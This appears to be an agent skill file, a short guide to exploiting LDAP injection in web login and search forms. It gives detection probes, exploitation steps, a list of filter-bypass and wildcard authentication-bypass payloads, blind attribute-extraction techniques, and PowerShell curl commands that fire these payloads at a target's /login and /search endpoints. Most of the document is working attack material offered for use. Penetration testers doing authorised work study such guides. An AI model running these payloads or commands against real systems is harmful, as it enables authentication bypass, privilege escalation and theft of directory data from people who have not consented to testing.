---
name: ldap-injection
description: LDAP injection in login/bind and search filters — filter bypass (&, |, ), *) and attribute extraction (blind). Use when the app authenticates or searches against LDAP/AD and reflects user-supplied values into filters.
category: injection
---

# LDAP Injection

## Detection
- Login form or search endpoint backed by LDAP (errors like `unable to bind`, `protocol error`, or app uses AD).
- Probe special chars: `* ( ) \ NUL` — unexpected behavior/500 signals filter construction.

## Exploitation
1. **Filter bypass**: username `*)(uid=*))(|(uid=*` or password `*)` in bind filters.
   - `(&(uid=USER)(userPassword=PASS))` → `(&(uid=*)(uid=*))(|(uid=*)(userPassword=*))`
2. **Auth bypass**: user = `admin*`, pass = `*` — wildcard bind.
3. **Blind extraction**: search filters with `(uid=*)(|(mail=a))` style boolean; extract attributes via `(|(cn=*)` + timing/status.
4. **Admin flag**: modify filter to `(|(objectClass=*)` when app adds `(!(admin=1))` exclusion.
5. **Privilege**: if bind result attributes are trusted, inject `(&(uid=x)(role=admin))`.

## Payloads
```
*)(uid=*))(|(uid=*
admin*
admin)(|(password=*
*)(&(objectClass=*
|(uid=*))(&(uid=*
```

## Tool Commands (Windows)
```powershell
# auth bypass probe
curl.exe -s -X POST "$U/login" -d 'user=*&pass=*' -i
# blind filter probe
curl.exe -s -X GET "$U/search?q=*)(cn=*" -i | Select-Object -First 20
```

## Verification & Evidence
- Login/session obtained without valid credentials, or LDAP search results differ based on injected filter.
- Save request/response/reproduce.